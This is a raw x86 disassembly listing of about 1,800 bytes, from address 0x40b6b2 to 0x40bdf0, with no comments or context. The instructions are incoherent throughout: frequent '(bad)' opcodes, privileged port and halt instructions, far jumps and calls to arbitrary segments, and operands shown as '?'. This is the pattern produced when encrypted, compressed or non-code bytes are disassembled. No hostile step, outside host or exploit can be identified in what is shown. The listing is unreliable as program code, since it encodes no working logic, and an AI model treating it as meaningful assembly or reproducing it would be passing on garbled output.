  40b6b2:	xchg   esi,eax
  40b6b3:	repz pop ds
  40b6b5:	sar    BYTE PTR [ecx+ebp*2+0x6f],0x6e
  40b6ba:	aam    0xb2
  40b6bc:	(bad)  
  40b6be:	and    ah,bh
  40b6c0:	adc    DWORD PTR [ecx],esp
  40b6c2:	inc    esp
  40b6c3:	adc    BYTE PTR [edx+edi*4],cl
  40b6c6:	push   ebp
  40b6c7:	and    ecx,eax
  40b6c9:	inc    esp
  40b6ca:	lods   eax,DWORD PTR ds:[esi]
  40b6cb:	jg     0x40b6aa
  40b6cd:	into   
  40b6ce:	adc    al,0xf5
  40b6d0:	ins    DWORD PTR es:[edi],dx
  40b6d1:	mov    al,ds:0x32d73f4d
  40b6d6:	jb     0x40b6d2
  40b6d8:	mov    edx,0xb1b0dc8f
  40b6dd:	test   DWORD PTR [eax],esi
  40b6df:	shl    BYTE PTR [ecx],cl
  40b6e1:	push   ds
  40b6e2:	adc    al,0xc
  40b6e4:	xchg   esi,eax
  40b6e5:	inc    edx
  40b6e6:	hlt    
  40b6e7:	push   esi
  40b6e8:	mov    ecx,0xc50e3db9
  40b6ed:	outs   dx,BYTE PTR ds:[esi]
  40b6ef:	rcl    BYTE PTR [edi+0x60fe5469],0x15
  40b6f6:	sar    BYTE PTR [eax],0xf5
  40b6f9:	push   esp
  40b6fa:	mov    WORD PTR [ebx+edi*4],ss
  40b6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6fe:	(bad)  
  40b6ff:	in     al,dx
  40b700:	out    0xf0,eax
  40b702:	sti    
  40b703:	mov    DWORD PTR [ebp-0x25],edi
  40b706:	sbb    al,0xf7
  40b708:	mov    ecx,0x9442b681
  40b70d:	cdq    
  40b70e:	xchg   esi,eax
  40b70f:	mov    esp,DWORD PTR [ebx+0x1f]
  40b712:	xchg   DWORD PTR [edx+edi*4],esp
  40b715:	rol    ebp,cl
  40b717:	or     edi,esi
  40b719:	xor    edi,DWORD PTR [ecx-0x1]
  40b71c:	inc    edx
  40b71d:	cdq    
  40b71e:	cmp    esp,DWORD PTR [ebp+0x3ddbcb25]
  40b724:	loope  0x40b762
  40b726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b727:	cs inc edi
  40b729:	cdq    
  40b72a:	stc    
  40b72b:	add    esp,DWORD PTR fs:[ecx+0x23fb9eaf]
  40b732:	xchg   esi,eax
  40b733:	sti    
  40b734:	bound  esp,QWORD PTR [ebx+0xb]
  40b737:	aad    0x91
  40b739:	mov    ebp,0xbf11ea32
  40b73e:	aas    
  40b73f:	sbb    eax,0x488b3de2
  40b744:	push   es
  40b745:	mov    cl,0xee
  40b747:	std    
  40b748:	sub    DWORD PTR ds:0xa7a31af5,esi
  40b74e:	push   ebx
  40b74f:	fisub  DWORD PTR [edi]
  40b751:	mov    eax,0xb3dd524e
  40b756:	mov    ebx,0xe8eafd0e
  40b75b:	pop    ebx
  40b75c:	and    BYTE PTR [ebp+0x7db7c8f0],bh
  40b762:	jecxz  0x40b742
  40b764:	mov    edx,0x2f57b8f3
  40b769:	repnz or bl,ah
  40b76c:	and    eax,0x2fcc1d1d
  40b771:	popf   
  40b772:	xor    ch,BYTE PTR [edi+0x54933423]
  40b778:	lods   al,BYTE PTR ds:[esi]
  40b779:	jb     0x40b7c8
  40b77b:	fisubr WORD PTR ds:0xdcceca1c
  40b781:	cmp    DWORD PTR [eax],ecx
  40b783:	scas   al,BYTE PTR es:[edi]
  40b784:	addr16 push eax
  40b786:	imul   BYTE PTR [edx-0x2a]
  40b789:	ret    0x95be
  40b78c:	mov    dh,0x5
  40b78e:	or     al,0xc1
  40b790:	dec    esi
  40b791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b792:	sahf   
  40b793:	ficomp WORD PTR [ecx]
  40b795:	nop
  40b796:	jno    0x40b78a
  40b798:	xor    al,0x5
  40b79a:	scas   eax,DWORD PTR es:[edi]
  40b79b:	and    DWORD PTR ds:0xe66ecefc,0x8d02835c
  40b7a5:	jnp    0x40b75f
  40b7a7:	jne    0x40b74c
  40b7a9:	jge    0x40b749
  40b7ab:	retf   
  40b7ac:	inc    ebx
  40b7ad:	push   es
  40b7ae:	cmc    
  40b7af:	inc    eax
  40b7b0:	inc    esi
  40b7b1:	lock sub al,0x6d
  40b7b4:	xchg   DWORD PTR [edx],edi
  40b7b6:	scas   eax,DWORD PTR es:[edi]
  40b7b7:	sbb    bh,dh
  40b7b9:	iret   
  40b7ba:	inc    edx
  40b7bb:	jle    0x40b818
  40b7bd:	repz jl 0x40b7ef
  40b7c0:	sbb    esp,DWORD PTR [ebp+0x45606a1f]
  40b7c6:	arpl   WORD PTR [esi+0x54],si
  40b7c9:	in     eax,0x9e
  40b7cb:	xchg   edi,eax
  40b7cc:	scas   eax,DWORD PTR es:[edi]
  40b7cd:	xchg   ecx,eax
  40b7ce:	aaa    
  40b7cf:	inc    ebx
  40b7d0:	nop
  40b7d1:	adc    BYTE PTR [edi+0x8],bh
  40b7d4:	push   cs
  40b7d5:	jb     0x40b84f
  40b7d7:	inc    esi
  40b7d8:	mov    esp,0xe17d7bab
  40b7dd:	addr16 add eax,0xc1a95813
  40b7e3:	jo     0x40b7fc
  40b7e5:	aas    
  40b7e6:	daa    
  40b7e7:	je     0x40b858
  40b7e9:	and    eax,DWORD PTR [eax-0x47be54cf]
  40b7ef:	cdq    
  40b7f0:	cld    
  40b7f1:	sub    ecx,DWORD PTR [eax]
  40b7f3:	scas   al,BYTE PTR es:[edi]
  40b7f4:	mov    BYTE PTR [edi-0x50684d25],0xa7
  40b7fb:	mov    esp,DWORD PTR [ecx-0x7ac87d38]
  40b801:	mov    ebp,0x175317f7
  40b806:	dec    ebp
  40b807:	rcr    BYTE PTR [ebx-0x3aefb0b0],0xc4
  40b80e:	addr16 enter 0x9bbc,0xeb
  40b813:	stos   DWORD PTR es:[edi],eax
  40b814:	fsubr  DWORD PTR [ebp-0x28924fd]
  40b81a:	push   esp
  40b81b:	mov    ebx,0xbce7c9cb
  40b820:	stc    
  40b821:	es xchg ebp,eax
  40b823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b824:	ds (bad) 
  40b826:	retf   
  40b827:	xlat   BYTE PTR ds:[ebx]
  40b828:	push   ecx
  40b829:	(bad)  
  40b82b:	dec    edx
  40b82c:	or     al,0xc9
  40b82e:	(bad)  
  40b82f:	daa    
  40b830:	mov    bl,0xc1
  40b832:	sahf   
  40b833:	xor    eax,DWORD PTR [ebx-0x1148cfa0]
  40b839:	in     al,0xe2
  40b83b:	adc    ebx,eax
  40b83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b83e:	pop    es
  40b83f:	xchg   DWORD PTR [edi],edi
  40b841:	push   esi
  40b842:	sbb    ebx,DWORD PTR [ebx]
  40b844:	sbb    al,0x4a
  40b846:	xchg   ecx,eax
  40b847:	aad    0x30
  40b849:	fsubr  DWORD PTR [esi]
  40b84b:	xchg   DWORD PTR [edx-0x2c],edi
  40b84e:	dec    esp
  40b84f:	mov    BYTE PTR [ebx+0x7b760336],ah
  40b855:	mov    ebx,0x13d758ff
  40b85a:	jmp    0xdeb:0x95f1614a
  40b861:	xchg   esi,eax
  40b862:	jge    0x40b8ae
  40b864:	(bad)  
  40b865:	mov    edi,0x1a9a934
  40b86a:	xchg   esp,eax
  40b86b:	pop    ss
  40b86c:	sbb    al,0xfb
  40b86e:	push   0xffffffc3
  40b870:	call   0x780c849c
  40b875:	jb     0x40b828
  40b877:	scas   eax,DWORD PTR es:[edi]
  40b878:	pop    edi
  40b879:	pop    esp
  40b87a:	adc    DWORD PTR [ebx],ecx
  40b87c:	outs   dx,BYTE PTR ds:[esi]
  40b87d:	sbb    DWORD PTR [esi],ebx
  40b87f:	int3   
  40b880:	push   esp
  40b881:	dec    esp
  40b882:	repz sbb BYTE PTR [eax-0x3289dd8f],cl
  40b889:	test   al,0xac
  40b88b:	xchg   esi,eax
  40b88c:	mov    bh,0xc3
  40b88e:	aam    0x17
  40b890:	jne    0x40b82b
  40b892:	leave  
  40b893:	adc    dl,dh
  40b895:	cmp    esi,edi
  40b897:	sbb    ch,BYTE PTR [edx+edx*4+0x46]
  40b89b:	mov    BYTE PTR es:[edi+0x249e6da7],ch
  40b8a2:	inc    esi
  40b8a3:	and    ebx,DWORD PTR [ebx]
  40b8a5:	jmp    0xb137e3fe
  40b8aa:	pop    eax
  40b8ab:	mov    ebp,0xf5c50a2b
  40b8b0:	mov    edi,0xfef25095
  40b8b5:	or     eax,0xb8ba19cf
  40b8ba:	dec    edx
  40b8bb:	icebp  
  40b8bc:	adc    bl,BYTE PTR [esi+0x68]
  40b8bf:	dec    ebx
  40b8c0:	inc    ebx
  40b8c1:	ins    DWORD PTR es:[edi],dx
  40b8c2:	inc    ebp
  40b8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c4:	dec    esp
  40b8c5:	sub    al,0x69
  40b8c7:	jle    0x40b8cc
  40b8c9:	dec    esi
  40b8ca:	cmc    
  40b8cb:	xchg   ebp,eax
  40b8cc:	inc    esi
  40b8cd:	adc    ch,BYTE PTR [ebp+0x1124be9]
  40b8d3:	jg     0x40b8fd
  40b8d5:	cmp    ch,BYTE PTR [eax]
  40b8d7:	jl     0x40b8ca
  40b8d9:	shr    BYTE PTR [esi-0x48],cl
  40b8dc:	pop    esi
  40b8dd:	push   edi
  40b8de:	inc    edi
  40b8df:	and    edi,DWORD PTR [ebx-0x28db83fc]
  40b8e5:	add    eax,0xedbfcb70
  40b8ea:	std    
  40b8eb:	push   eax
  40b8ec:	adc    eax,0x41daa6ff
  40b8f1:	pop    edi
  40b8f2:	push   0xfffffffd
  40b8f4:	xor    BYTE PTR [esi+0x30],dl
  40b8f7:	pop    ebx
  40b8f8:	loope  0x40b926
  40b8fa:	sbb    eax,0xa89a4ad7
  40b8ff:	stos   DWORD PTR es:[edi],eax
  40b900:	sti    
  40b901:	dec    edx
  40b902:	les    ecx,FWORD PTR [edx+0x4c2cb1c3]
  40b908:	xchg   esp,eax
  40b909:	xlat   BYTE PTR ds:[ebx]
  40b90a:	or     ch,BYTE PTR [ebx]
  40b90c:	jns    0x40b893
  40b90e:	loopne 0x40b952
  40b910:	das    
  40b911:	cmp    bh,BYTE PTR [ebp-0x34]
  40b914:	(bad)  
  40b915:	(bad)  
  40b916:	jp     0x40b98b
  40b918:	lahf   
  40b919:	leave  
  40b91a:	gs jge 0x40b8e5
  40b91d:	dec    eax
  40b91e:	mov    edx,0xfb639073
  40b923:	out    0x42,al
  40b925:	fstp   QWORD PTR [esp+esi*8+0x45c40e1d]
  40b92c:	pop    edx
  40b92d:	push   edi
  40b92e:	xchg   esi,eax
  40b92f:	inc    edi
  40b930:	mov    ecx,0x73e1fe4f
  40b935:	data16 jo 0x40b8d2
  40b938:	faddp  st(0),st
  40b93a:	push   ebp
  40b93b:	(bad)  
  40b93d:	mov    ax,si
  40b940:	(bad)  
  40b941:	inc    esp
  40b942:	inc    ebp
  40b943:	pop    edi
  40b944:	cld    
  40b945:	ss clc 
  40b947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b948:	je     0x40b917
  40b94a:	nop
  40b94b:	cmp    eax,0xbbd28e1f
  40b950:	adc    DWORD PTR [edx],edi
  40b952:	in     eax,0x84
  40b954:	fbld   TBYTE PTR [edx+0x74b88f1]
  40b95a:	adc    al,0x31
  40b95d:	add    DWORD PTR [esi+0x49],0x2bfc89da
  40b964:	cld    
  40b965:	mov    eax,0xce015801
  40b96a:	(bad)  
  40b96b:	pop    esi
  40b96c:	icebp  
  40b96d:	push   ebp
  40b96e:	push   esp
  40b96f:	les    ebp,FWORD PTR [eax]
  40b971:	in     al,dx
  40b972:	pop    esp
  40b973:	mov    dh,0xfd
  40b975:	daa    
  40b976:	fmul   DWORD PTR [esi-0x609dd488]
  40b97c:	popa   
  40b97d:	popa   
  40b97e:	pop    edx
  40b97f:	and    ah,dl
  40b981:	cmp    dl,BYTE PTR [edx]
  40b983:	cmp    ch,BYTE PTR [edi-0x33]
  40b986:	push   ds
  40b987:	pop    ebx
  40b988:	mov    ebx,0xcf770985
  40b98d:	test   al,0x12
  40b98f:	inc    ebx
  40b990:	icebp  
  40b991:	stos   BYTE PTR es:[edi],al
  40b992:	in     al,0x70
  40b994:	lea    eax,ds:0x29b4363b
  40b99a:	dec    DWORD PTR [edi-0xe]
  40b99d:	mov    ebx,0x532f3050
  40b9a2:	shr    BYTE PTR [edi-0x46],0x4e
  40b9a6:	push   edx
  40b9a7:	data16 mov ds:0xd829df19,al
  40b9ad:	fidiv  WORD PTR [eax+0x58]
  40b9b0:	jl     0x40b9cb
  40b9b2:	fisubr DWORD PTR [esi-0x16c84e74]
  40b9b8:	jp     0x40b95d
  40b9ba:	adc    DWORD PTR [edi-0x16],edx
  40b9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9be:	xor    BYTE PTR [ecx+0x66871168],dl
  40b9c4:	pop    edx
  40b9c5:	ror    BYTE PTR gs:[ecx-0x724cff63],1
  40b9cc:	xor    al,0xdb
  40b9ce:	dec    ebx
  40b9cf:	aaa    
  40b9d0:	mov    ch,0x18
  40b9d2:	test   ecx,ecx
  40b9d4:	cmp    ebp,DWORD PTR [edi+0x76]
  40b9d7:	mov    dh,ah
  40b9d9:	rcl    DWORD PTR [edx+edi*1+0x1031c788],cl
  40b9e0:	rcl    DWORD PTR [ebp+0x6c],0x3e
  40b9e4:	int3   
  40b9e5:	jns    0x40b9f1
  40b9e7:	xlat   BYTE PTR fs:[ebx]
  40b9e9:	dec    edx
  40b9ea:	mov    eax,ds:0x32378ace
  40b9ef:	xor    DWORD PTR [ebx-0x56],ecx
  40b9f2:	test   DWORD PTR [edx-0x5a2529a0],eax
  40b9f8:	mov    ?,WORD PTR [edi+0x50527664]
  40b9fe:	fwait
  40b9ff:	loopne 0x40b9d8
  40ba01:	(bad)  
  40ba02:	aaa    
  40ba03:	sub    eax,0xc1ca0c09
  40ba08:	or     al,BYTE PTR [edx]
  40ba0a:	pop    esi
  40ba0b:	test   DWORD PTR [ebx+eax*1],esp
  40ba0e:	xchg   esp,eax
  40ba0f:	jle    0x40ba2f
  40ba11:	inc    edx
  40ba12:	pop    es
  40ba13:	mov    al,0xfc
  40ba15:	and    BYTE PTR [ebx+0x74],al
  40ba18:	aaa    
  40ba19:	mov    ah,0x77
  40ba1b:	cmp    al,0x6c
  40ba1d:	mov    DWORD PTR [ecx+0x7ec1ecf5],0xcabd3264
  40ba27:	fcom   DWORD PTR [edi+0x636f58c]
  40ba2d:	stos   BYTE PTR es:[edi],al
  40ba2e:	cld    
  40ba2f:	les    ebx,FWORD PTR [ebx+0x0]
  40ba32:	mov    ds:0x99856308,al
  40ba37:	mov    BYTE PTR [edx+ebp*8+0x32],0x7c
  40ba3c:	bound  ecx,QWORD PTR [esi-0x857704f]
  40ba42:	popf   
  40ba43:	mov    al,0xc9
  40ba45:	cmp    DWORD PTR [esi],esp
  40ba47:	in     al,0xd9
  40ba49:	cmp    al,0x83
  40ba4b:	jle    0x40baa4
  40ba4d:	pusha  
  40ba4e:	push   ebx
  40ba4f:	or     BYTE PTR [edx+0x77ccf801],ah
  40ba55:	and    al,0x37
  40ba57:	in     al,dx
  40ba58:	sbb    cl,BYTE PTR [edx+0x6319167f]
  40ba5e:	sbb    ebp,DWORD PTR [edi-0x430e1ad7]
  40ba64:	mov    al,ds:0xa6183b41
  40ba69:	jb     0x40ba0b
  40ba6b:	mov    edx,0x6c2229d2
  40ba70:	inc    esi
  40ba71:	mov    ecx,0x33ee7c06
  40ba76:	inc    esi
  40ba77:	imul   ebp,DWORD PTR [ebp+0x28],0x1e3388e
  40ba7e:	sub    DWORD PTR [ebp+0x36ba7a89],eax
  40ba84:	mov    ch,0x64
  40ba86:	popf   
  40ba87:	mov    bl,0x75
  40ba89:	jl     0x40ba0e
  40ba8b:	ret    0x8929
  40ba8e:	xchg   DWORD PTR [edx-0x73],eax
  40ba91:	imul   esp,DWORD PTR [ecx-0x43],0x65
  40ba95:	jnp    0x40baa8
  40ba97:	xchg   ecx,eax
  40ba98:	(bad)  
  40ba99:	daa    
  40ba9a:	pop    es
  40ba9b:	loopne 0x40bab3
  40ba9d:	xor    DWORD PTR [edi-0x43],esi
  40baa0:	inc    esi
  40baa1:	xchg   ecx,eax
  40baa2:	xor    cl,BYTE PTR [esi-0x77]
  40baa5:	xor    edi,DWORD PTR [ecx]
  40baa7:	jbe    0x40ba49
  40baa9:	test   al,0x4e
  40baab:	dec    esi
  40baac:	aaa    
  40baad:	xor    ebx,edi
  40baaf:	sbb    al,0x3f
  40bab1:	aas    
  40bab2:	push   ds
  40bab3:	pop    es
  40bab4:	xchg   edx,eax
  40bab5:	jp     0x40ba39
  40bab7:	mov    al,0x23
  40bab9:	push   ss
  40baba:	cld    
  40babb:	xor    al,0x4a
  40babd:	cmp    al,0xdc
  40babf:	jg     0x40ba63
  40bac1:	mov    dh,0x5
  40bac3:	add    esi,eax
  40bac5:	loope  0x40baab
  40bac7:	mov    WORD PTR [ebp+esi*4-0x73],cs
  40bacb:	test   al,0x17
  40bacd:	mov    ?,WORD PTR [ebx]
  40bacf:	sub    esi,ebx
  40bad1:	inc    BYTE PTR [ecx-0x3a]
  40bad4:	cmp    al,0xfc
  40bad6:	imul   eax,DWORD PTR [esi],0xffffffaa
  40bad9:	out    0x62,al
  40badb:	je     0x40ba6b
  40badd:	xor    al,0x78
  40badf:	mov    edi,0xe320b4ee
  40bae4:	xchg   ebx,eax
  40bae5:	fidivr WORD PTR [edi-0x14070a27]
  40baeb:	pusha  
  40baec:	push   esp
  40baed:	inc    ebx
  40baee:	lock in eax,0x85
  40baf1:	lds    ebx,FWORD PTR [edi+0x6f]
  40baf4:	xchg   DWORD PTR [ebp-0x7a5e2c1e],ebx
  40bafa:	cdq    
  40bafb:	cmc    
  40bafc:	jle    0x40bb17
  40bafe:	xor    BYTE PTR [edx+edi*4],ah
  40bb01:	aaa    
  40bb02:	fst    DWORD PTR [eax-0x60]
  40bb05:	jl     0x40bb6e
  40bb07:	idiv   BYTE PTR [edi]
  40bb09:	adc    BYTE PTR [edi+eax*2-0x7970529e],ch
  40bb10:	mov    eax,0xec4e9d92
  40bb15:	retf   
  40bb16:	dec    esp
  40bb17:	or     ch,BYTE PTR [eax]
  40bb19:	retf   0x2cad
  40bb1c:	scas   eax,DWORD PTR es:[edi]
  40bb1d:	and    esi,DWORD PTR [edx+esi*1]
  40bb20:	or     DWORD PTR [esp+ebp*4-0x60],ebp
  40bb24:	nop    DWORD PTR [esi+ebx*8-0x2cec6473]
  40bb2c:	in     al,dx
  40bb2d:	es aas 
  40bb2f:	cmp    edi,DWORD PTR [ebx+0x5f848b4f]
  40bb35:	adc    al,0x1a
  40bb38:	(bad)  
  40bb39:	cmp    ah,BYTE PTR [eax-0x3ff1377e]
  40bb3f:	pop    ebp
  40bb40:	jecxz  0x40bb86
  40bb42:	pop    ebx
  40bb43:	fwait
  40bb44:	jmp    0x106b163
  40bb49:	(bad)  
  40bb4a:	mov    dh,0xb7
  40bb4c:	sub    dl,bl
  40bb4e:	push   esp
  40bb4f:	dec    esi
  40bb50:	push   cs
  40bb51:	repnz xchg edi,eax
  40bb53:	push   ebx
  40bb54:	cmp    BYTE PTR [ebx],dl
  40bb56:	push   ecx
  40bb57:	inc    edx
  40bb58:	xor    eax,0xf410a2d0
  40bb5d:	(bad)  
  40bb5e:	shl    edx,1
  40bb60:	sub    al,0x64
  40bb62:	cs or  al,dl
  40bb65:	in     eax,0xd4
  40bb67:	stos   BYTE PTR es:[edi],al
  40bb68:	enter  0x33e0,0x39
  40bb6c:	xchg   di,ax
  40bb6e:	or     esi,DWORD PTR [eax+0x13]
  40bb71:	inc    edi
  40bb72:	pushf  
  40bb73:	repz aad 0xbc
  40bb76:	enter  0x399e,0xe
  40bb7a:	add    edx,edi
  40bb7c:	or     ebp,DWORD PTR [eax-0x20]
  40bb7f:	adc    cl,dl
  40bb81:	aam    0xdb
  40bb83:	pop    eax
  40bb84:	in     eax,dx
  40bb85:	jmp    0x40bbf5
  40bb87:	mov    ds:0x77e73f83,al
  40bb8c:	mov    esp,0x52d1d542
  40bb91:	bound  esi,QWORD PTR [ebx]
  40bb93:	das    
  40bb94:	in     eax,dx
  40bb95:	fwait
  40bb96:	xchg   esi,ebx
  40bb98:	les    ebp,FWORD PTR [esi+0x13]
  40bb9b:	push   edi
  40bb9c:	jne    0x40bbdc
  40bb9e:	gs (bad) 
  40bba1:	shl    ebx,1
  40bba3:	scas   al,BYTE PTR es:[edi]
  40bba4:	mov    cl,0xf2
  40bba6:	(bad)  
  40bba7:	nop
  40bba8:	div    DWORD PTR [ebx+0x589f7a27]
  40bbae:	xchg   edx,eax
  40bbaf:	fbld   TBYTE PTR [ebp+0x7b]
  40bbb2:	mov    ecx,0x35ffac18
  40bbb7:	pop    ebx
  40bbb8:	dec    eax
  40bbb9:	push   cs
  40bbba:	push   esi
  40bbbb:	out    dx,al
  40bbbc:	or     esi,DWORD PTR [edi-0x41]
  40bbbf:	(bad)  
  40bbc0:	loopne 0x40bc1b
  40bbc2:	push   ebp
  40bbc3:	jp     0x40bb67
  40bbc5:	push   0xfffffffe
  40bbc7:	jmp    0x55dd:0x7ce81dc
  40bbce:	pushf  
  40bbcf:	(bad)  
  40bbd0:	mov    eax,0x28c473a8
  40bbd5:	scas   eax,DWORD PTR es:[edi]
  40bbd6:	xor    edx,0xffffffed
  40bbd9:	lock mov edi,0x4933990
  40bbdf:	xor    eax,0x2895f0f8
  40bbe4:	dec    ebp
  40bbe5:	inc    ebp
  40bbe6:	jmp    0x40bbfa
  40bbe8:	add    ah,BYTE PTR [eax]
  40bbea:	fstp   QWORD PTR [ebx+0x1d]
  40bbed:	call   0x6b1a:0xb8f61b8
  40bbf4:	inc    ecx
  40bbf5:	fimul  WORD PTR [ecx]
  40bbf7:	fs lock cmp ebx,0xffffffa9
  40bbfc:	(bad)  
  40bbfd:	les    edi,FWORD PTR [ebp-0x35809386]
  40bc03:	fstp   DWORD PTR [ebp+0x10]
  40bc06:	jns    0x40bbd2
  40bc08:	and    eax,0xdc249f67
  40bc0d:	in     al,0x9c
  40bc0f:	inc    eax
  40bc10:	fdiv   st,st(7)
  40bc12:	jmp    0x40bbaf
  40bc14:	and    DWORD PTR fs:[ecx],ebp
  40bc17:	xchg   esi,eax
  40bc18:	retf   
  40bc19:	fst    st(1)
  40bc1b:	mov    bl,0x4c
  40bc1d:	ds out dx,eax
  40bc1f:	push   eax
  40bc20:	mov    ebp,0x3aa18eb2
  40bc25:	mov    BYTE PTR [edx],0x1f
  40bc28:	or     al,BYTE PTR [edi+0x4b0066e0]
  40bc2e:	dec    edi
  40bc2f:	mov    esi,0xbdbe1569
  40bc34:	fild   QWORD PTR [eax+0x57]
  40bc37:	adc    esp,0x3f
  40bc3a:	pop    ss
  40bc3b:	add    bl,BYTE PTR [esi-0x11a54351]
  40bc41:	push   0xb7186278
  40bc46:	mov    ds:0x1ee38eff,al
  40bc4b:	pushf  
  40bc4c:	push   edi
  40bc4d:	push   esi
  40bc4e:	lods   al,BYTE PTR ds:[esi]
  40bc4f:	cld    
  40bc50:	sbb    edx,edx
  40bc52:	xchg   esp,eax
  40bc53:	(bad)  
  40bc54:	in     eax,dx
  40bc55:	jl     0x40bc62
  40bc57:	or     al,BYTE PTR [esi+eax*8+0x4f93c5f1]
  40bc5e:	dec    edi
  40bc5f:	pop    ecx
  40bc60:	push   ebx
  40bc61:	mov    ecx,0xf9b8cfec
  40bc66:	and    eax,0x49e68e4e
  40bc6b:	xor    ebp,DWORD PTR [ecx]
  40bc6d:	inc    edx
  40bc6e:	mov    ah,0x9a
  40bc70:	inc    edx
  40bc71:	xor    eax,0x1a86b1c4
  40bc76:	int    0xf9
  40bc78:	aas    
  40bc79:	les    eax,FWORD PTR [edx+0x71f41842]
  40bc7f:	mov    eax,0xeba4d47b
  40bc84:	and    ebx,edx
  40bc86:	mov    eax,ds:0x22989a9a
  40bc8b:	int3   
  40bc8c:	cmc    
  40bc8d:	pusha  
  40bc8e:	push   ecx
  40bc8f:	lods   eax,DWORD PTR ds:[esi]
  40bc90:	mov    ah,BYTE PTR [edi+0x5e43e862]
  40bc96:	stc    
  40bc97:	mov    ebx,0x69911d08
  40bc9c:	xlat   BYTE PTR ds:[ebx]
  40bc9d:	ror    BYTE PTR [ebp+0x6439520e],1
  40bca3:	ins    BYTE PTR es:[di],dx
  40bca5:	fwait
  40bca6:	adc    bh,BYTE PTR [ebx-0x27b070f5]
  40bcac:	dec    esp
  40bcad:	cs cmp bl,cl
  40bcb0:	xlat   BYTE PTR ds:[ebx]
  40bcb1:	jo     0x40bd1f
  40bcb3:	pop    esp
  40bcb4:	inc    esi
  40bcb5:	in     al,0xcf
  40bcb7:	push   ebp
  40bcb8:	lahf   
  40bcb9:	mov    ah,0xe
  40bcbb:	ss pop ecx
  40bcbd:	add    eax,0x379d765b
  40bcc2:	xor    eax,0x8e6660db
  40bcc7:	pop    ebx
  40bcc8:	push   ebp
  40bcc9:	rcl    DWORD PTR [esi],1
  40bccb:	sahf   
  40bccc:	cvtpi2ps xmm4,QWORD PTR ds:0x5540daa4
  40bcd3:	das    
  40bcd4:	popf   
  40bcd5:	sbb    bl,al
  40bcd7:	xchg   ebx,eax
  40bcd8:	adc    BYTE PTR [ebx+esi*2+0x1605d622],ch
  40bcdf:	repnz icebp 
  40bce1:	mov    ebp,0x8e82ac6f
  40bce6:	(bad)
  40bce9:	pop    ds
  40bcea:	or     eax,0x39c3d43b
  40bcef:	xchg   esi,eax
  40bcf0:	mov    ebx,0xd9d7e39e
  40bcf5:	pop    ebx
  40bcf6:	inc    ebx
  40bcf7:	jae    0x40bcca
  40bcf9:	and    al,BYTE PTR [ebx]
  40bcfb:	mov    al,ds:0x4eeff578
  40bd00:	xlat   BYTE PTR ds:[ebx]
  40bd01:	lahf   
  40bd02:	add    BYTE PTR [ecx],0x11
  40bd05:	test   ch,bl
  40bd07:	fild   DWORD PTR [ecx]
  40bd09:	adc    eax,0xe6596283
  40bd0e:	mov    edi,0xce492835
  40bd13:	or     BYTE PTR ds:0x63df5469,ch
  40bd19:	scas   eax,DWORD PTR es:[edi]
  40bd1a:	mov    eax,ds:0x5ca95716
  40bd1f:	inc    esp
  40bd20:	jle    0x40bcdb
  40bd22:	mov    eax,0x477a6e9f
  40bd27:	or     eax,0xf0d28392
  40bd2c:	xor    al,bl
  40bd2e:	mov    al,0x8c
  40bd30:	pop    ebx
  40bd31:	and    DWORD PTR [ecx],ecx
  40bd33:	test   eax,0x6ace4145
  40bd38:	dec    edx
  40bd39:	aas    
  40bd3a:	pop    edi
  40bd3b:	lahf   
  40bd3c:	int3   
  40bd3d:	xchg   BYTE PTR [ebx],dl
  40bd3f:	fdiv   st(2),st
  40bd41:	js     0x40bd26
  40bd43:	add    ch,BYTE PTR [ebp-0x53]
  40bd46:	pop    edx
  40bd47:	aaa    
  40bd48:	and    BYTE PTR [edi],bh
  40bd4a:	stc    
  40bd4b:	mov    eax,esi
  40bd4d:	idiv   al
  40bd4f:	into   
  40bd50:	pusha  
  40bd51:	(bad)
  40bd54:	sub    eax,0xf6c58b80
  40bd59:	xchg   DWORD PTR [esi+edi*1-0x76],ebp
  40bd5d:	sbb    DWORD PTR [eax+0x3c19900e],esi
  40bd63:	lods   al,BYTE PTR ds:[esi]
  40bd64:	push   esp
  40bd65:	mov    ds:0xf9e7b6bd,eax
  40bd6a:	outs   dx,DWORD PTR ds:[esi]
  40bd6b:	hlt    
  40bd6c:	jae    0x40bda9
  40bd6e:	es call 0xae262e1c
  40bd74:	mov    cl,0xf1
  40bd76:	dec    ebx
  40bd77:	icebp  
  40bd78:	jae    0x40bdda
  40bd7a:	sahf   
  40bd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd7c:	inc    esi
  40bd7d:	and    DWORD PTR [edi+0xf],eax
  40bd80:	in     eax,0x62
  40bd82:	sub    eax,0xd4cf0a7d
  40bd87:	fst    st(6)
  40bd89:	xchg   ecx,eax
  40bd8a:	adc    DWORD PTR [edi-0x28a014db],ebx
  40bd90:	jecxz  0x40be05
  40bd92:	pop    ebx
  40bd93:	add    ebx,DWORD PTR [esi]
  40bd95:	fmul   st,st(4)
  40bd97:	sbb    BYTE PTR [eax-0x356121d6],cl
  40bd9d:	cmp    al,0x45
  40bd9f:	jmp    0xfa58f6ed
  40bda4:	sub    eax,0x30d025a
  40bda9:	pop    ecx
  40bdaa:	add    eax,0x162be73b
  40bdaf:	stos   BYTE PTR es:[edi],al
  40bdb0:	cmp    cl,dh
  40bdb2:	inc    edx
  40bdb3:	pop    edx
  40bdb4:	cmp    al,0x7f
  40bdb6:	mov    dh,0x35
  40bdb8:	lock sar BYTE PTR [edx],0xa7
  40bdbc:	adc    esp,DWORD PTR [edi+ebp*8-0xc6d51eb]
  40bdc3:	jb     0x40bd53
  40bdc5:	sbb    esi,DWORD PTR [ebx+0x1314cefa]
  40bdcb:	push   ss
  40bdcc:	inc    eax
  40bdcd:	pop    edi
  40bdce:	xchg   ebp,eax
  40bdcf:	jl     0x40be33
  40bdd1:	loope  0x40be08
  40bdd3:	loopne 0x40bd97
  40bdd5:	les    ebx,FWORD PTR [edi-0x73]
  40bdd8:	cld    
  40bdd9:	xor    eax,0xa8725ccf
  40bdde:	call   0xcb08:0x290bd456
  40bde5:	mov    ah,0x4d
  40bde7:	jle    0x40be61
  40bde9:	cmp    eax,0x4f849b7b
  40bdee:	jecxz  0x40bdb3
  40bdf0:	ret    0x6682
